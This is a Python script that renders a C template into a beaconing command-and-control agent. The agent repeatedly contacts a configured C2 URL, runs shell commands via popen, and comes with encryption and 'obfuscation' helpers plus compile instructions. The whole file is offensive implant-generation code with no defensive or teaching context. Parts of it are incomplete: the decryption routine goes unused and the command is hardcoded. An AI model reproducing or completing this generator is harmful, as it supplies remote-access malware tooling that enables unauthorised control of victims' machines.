import os
import base64
import random
import string
import subprocess
from Crypto.Cipher import AES
from jinja2 import Template


# AES-GCM encryption setup
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode("utf-8"))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")


# Generate random string for obfuscation
def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# Template for a cross-platform agent in C using OpenSSL 3.0+ API
AGENT_TEMPLATE_C = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <openssl/evp.h>

#define C2_URL "{{ c2_url }}"
#define BEACON_INTERVAL {{ beacon_interval }}
unsigned char SECRET_KEY[32] = { {{ secret_key }} };

void decrypt_data(unsigned char *enc_data, int len, unsigned char *output) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, SECRET_KEY, enc_data);
    int out_len;
    EVP_DecryptUpdate(ctx, output, &out_len, enc_data + 16, len - 16);
    EVP_CIPHER_CTX_free(ctx);
}

void execute_command(const char *command) {
    char buffer[128];
    FILE *pipe = popen(command, "r");
    if (!pipe) return;
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        printf("%s", buffer);
    }
    pclose(pipe);
}

int main() {
    CURL *curl;
    CURLcode res;
    while (1) {
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                char command[128] = "whoami";
                execute_command(command);
            }
            curl_easy_cleanup(curl);
        }
        sleep(BEACON_INTERVAL);
    }
    return 0;
}
"""


def generate_agent(c2_url, secret_key, beacon_interval=10, output_file="agent.c"):
    secret_key_c = ', '.join(str(b) for b in secret_key)
    template = Template(AGENT_TEMPLATE_C)
    agent_code = template.render(
        c2_url=c2_url,
        secret_key=secret_key_c,
        beacon_interval=beacon_interval
    )
    with open(output_file, "w") as f:
        f.write(agent_code)
    print(f"Agent saved to {output_file}. Compile with: gcc {output_file} -o agent -lcurl -lssl -lcrypto")


# Example usage
if __name__ == "__main__":
    secret_key = os.urandom(32)  # Generate a secure key
    generate_agent("http://10.0.0.17", secret_key)
